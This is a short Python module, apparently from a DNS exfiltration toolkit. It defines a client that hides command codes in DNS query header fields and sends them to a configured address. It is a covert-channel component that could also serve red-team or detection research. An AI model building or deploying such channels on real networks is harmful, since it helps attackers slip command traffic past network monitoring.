import dnslib

from dns_exfil import config

from dns_exfil.exfiltrators.base.client import BaseClient

class CommandNotConfigured(Exception):
    pass


class HeaderExecuterClient(BaseClient):
    def __init__(self, domain, connect):
        self.domain = domain
        self.connect = connect
        super().__init__()
    def command(self, command):
        record = dnslib.DNSRecord()
        record.add_question(dnslib.DNSQuestion(self.domain, dnslib.QTYPE.A))
        for condition, match in self.context['header_conditions'].items():
            setattr(record.header, condition, match)
        record.header.id = self.context['command_map'][command]
        record.send(self.connect) 
